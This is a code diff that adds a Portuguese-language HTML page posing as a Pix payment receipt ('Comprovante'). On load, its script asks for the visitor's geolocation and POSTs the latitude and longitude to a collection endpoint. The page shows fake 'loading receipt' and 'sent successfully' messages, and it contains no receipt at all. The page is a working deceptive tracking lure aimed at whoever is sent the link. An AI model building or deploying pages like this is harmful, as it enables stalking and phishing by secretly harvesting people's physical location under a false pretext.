@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Comprovante</title>
+</head>
+<body style="background-color: antiquewhite;">
+  <h1>Comprovante</h1>
+  <p id="status">Aguardando carregar comprovante</p>
+
+  <script>
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        updateStatus("Geolocalização não suportada pelo navegador.");
+      }
+    });
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      console.log("Latitude: " + latitude);
+      console.log("Longitude: " + longitude);
+
+      updateStatus("Carregando comprovante Pix...");
+
+      fetch("http://localhost:8088/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          updateStatus("Comprovante enviado com sucesso!");
+        } else {
+          updateStatus("Erro ao enviar localização: " + (data.message || "Tente novamente."));
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+        updateStatus("Erro na requisição: " + error.message);
+      });
+    }
+
+    function handleError(error) {
+      updateStatus("Erro ao obter a localização: " + error.message);
+    }
+
+    function updateStatus(message) {
+      document.getElementById("status").textContent = message;
+    }
+  </script>
+</body>
+</html>
